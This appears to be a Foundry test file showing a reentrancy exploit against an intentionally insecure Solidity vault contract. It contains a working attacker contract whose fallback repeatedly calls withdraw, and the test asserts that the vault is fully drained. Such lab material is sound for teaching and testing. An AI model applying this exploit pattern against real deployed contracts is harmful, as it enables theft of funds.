// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {InsecureVault} from "../src/InsecureVault.sol";

contract ReentrancyAttacker {
    InsecureVault public vault;

    constructor(InsecureVault vault_) {
        vault = vault_;
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}

contract InsecureVaultTest is Test {
    InsecureVault internal vault;

    function setUp() public {
        vault = new InsecureVault();
        vault.deposit{value: 10 ether}();
    }

    function test_ReentrancyDrainsVault() public {
        ReentrancyAttacker attacker = new ReentrancyAttacker(vault);
        attacker.attack{value: 1 ether}();

        assertEq(address(vault).balance, 0);
        assertGt(address(attacker).balance, 10 ether);
    }
}
